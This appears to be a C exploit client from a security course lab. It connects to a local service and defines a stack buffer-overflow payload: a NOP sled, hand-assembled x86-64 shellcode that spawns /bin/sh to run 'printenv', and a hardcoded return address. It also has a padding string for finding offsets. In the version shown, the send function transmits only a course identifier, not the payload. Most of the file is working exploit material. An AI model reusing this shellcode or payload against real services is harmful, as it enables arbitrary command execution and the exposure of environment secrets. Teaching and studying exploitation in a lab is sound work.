#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <netdb.h>

char inbuff[1024];

void DoAttack(int PortNo);
void Attack(FILE * outfile);

int main(int argc, char * argv[]){

    char * studStr, *portStr;
    int studLen, portLen;
    int studNo, portNo;
    int i;

    if (argc != 2){
        fprintf(stderr, "usage %s portno\n", argv[0]);
        exit(1);
    }

    portStr = argv[1];
    if ((portLen = strlen(portStr)) < 1){
        fprintf(stderr, "%s: port number must be 1 or more digits\n", argv[0]);
        exit(1);
    }
    for (i = 0; i < portLen; i++){
        if(!isdigit(portStr[i])){
            fprintf(stderr, "%s: port number must be all digits\n", argv[0]);
            exit(1);
        }
    }
    portNo = atoi(portStr);

    fprintf(stderr, "Port Number  %d\n", portNo);

    DoAttack(portNo);

    exit(0);
}

void  DoAttack(int portNo) {
    int server_sockfd;
    int serverlen;

    struct sockaddr_in server_address;

    FILE * outf;
    FILE * inf;
    struct hostent *h;


    server_sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if((h=gethostbyname("localhost"))==NULL){
        fprintf(stderr,"Host Name Error...");
        exit(1);
    }

    server_address.sin_family = AF_INET;
    memcpy((char *) &server_address.sin_addr.s_addr, h->h_addr_list[0], h->h_length);
    /* server_address.sin_addr.s_addr = htonl(INADDR_ANY); */
    server_address.sin_port = htons(portNo);

    if(connect(server_sockfd,(struct sockaddr*)&server_address,sizeof(struct sockaddr))==-1){
        fprintf(stderr,"Connection out...");
        exit(1);
    }

    outf = fdopen(server_sockfd, "w");

    // add log message here
    Attack(outf);

    inf = fdopen(server_sockfd, "r");
    if (inf == NULL){
        fprintf(stderr,"could not open socket for read");
        exit(1);
    }
    do {
        inbuff[0] = '\0';
        fgets(inbuff,1024,inf);
        if (inbuff[0]){
            fputs(inbuff,stdout);
        }
    } while (!feof(inf));
    fclose(outf);
    fclose(inf);
    return;
}

char compromise[224] = {
    0x90, 0x90, 0x90, 0x90, 0x90, // NOPs
    0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90,

    0xEB, 0x4F,                  //  start:     jmp short codeEnd
    0x5E,                    //  start2:    pop rsi
    0x48, 0x31, 0xC0,                //             xor rax, rax
    0x88, 0x46, 0x07,                //             mov [rsi + flagStr-exeStr - 2],al
    0x88, 0x46, 0x0B,                //             mov [rsi + cmdStr-exeStr - 1],al
    0x88, 0x46, 0x19,                //             mov [rsi + arrayAddr-exeStr - 1],al
    0x48, 0x89, 0x46, 0x32,              //             mov [rsi + arrayAddr-exeStr + 24],rax
    0x48, 0x89, 0x76, 0x1A,              //             mov [rsi + arrayAddr - exeStr], rsi
    0x48, 0x8D, 0x7E, 0x09,              //             lea rdi, [rsi + flagStr - exeStr]
    0x48, 0x89, 0x7E, 0x1E,              //             mov [rsi + arrayAddr - exeStr + 4], rdi
    0x48, 0x8D, 0x7E, 0x0C,              //             lea rdi, [rsi + cmdStr - exeStr]
    0x48, 0x89, 0x7E, 0x22,              //             mov [rsi + arrayAddr - exeStr + 8], rdi
    0x48, 0x89, 0xE2,                //             mov rdx, rsp
    0x48, 0xC1, 0xEA, 0x20,              //             shr rdx, 32
    0x48, 0xC1, 0xE2, 0x20,              //             shl rdx, 32
    0xB9, 0x38, 0xE1, 0xFF, 0xF7,            //             mov rcx, 0xf7ffe138
    0x48, 0x09, 0xCA,                //             or rdx, rcx
    0x48, 0x31, 0xC0,                //             xor rax, rax
    0x48, 0x89, 0xF7,                //             mov rdi, rsi
    0x48, 0x8D, 0x76, 0x1A,              //             lea rsi, [rsi + arrayAddr - exeStr]
    0x48, 0x8B, 0x12,                //             mov rdx,[rdx]
    0x0F, 0x05,                  //             syscall
    0x48, 0x89, 0xC7,                //             mov rdi,rax
    0x48, 0x31, 0xC0,                //             xor rax, rax
    0x0F, 0x05,                  //             syscall
    0xE8, 0xAC, 0xFF, 0xFF, 0xFF,            //  codeEnd:   call start2
    0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x58, 0x79,   //  exeStr:    db "/bin/shXy"
    0x2D, 0x63, 0x58,                //  flagStr:   db "-cX"
    0x70, 0x72, 0x69, 0x6E, 0x74, 0x65, 0x6E, 0x76, 0x3B,   //  cmdStr:    db "printenv;exitX"
    0x65, 0x78, 0x69, 0x74, 0x58,            //
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,    //  arrayAddr: dq exeStr
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,    //             dq flagStr
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,    //             dq cmdStr
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,      //             dq 0xffffffffffffffff

    0x98, 0xE0, 0xFF, 0xFF,0xFF, 0x7F, //Return address stack replace   

    //end
    0x0A, 0x00
};
char * compromise1 =
    "\x03\x02\x01xxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxx"
    "MNOPWXYZ"
    "xxxxxxx\x90\x90\x90\x90\x90\x90\x90\x90\n";

// change to write so we can write NULLs
void Attack(FILE * outfile){
    fprintf(outfile, "%s", "377 Student\n");  
    fflush(outfile);
}

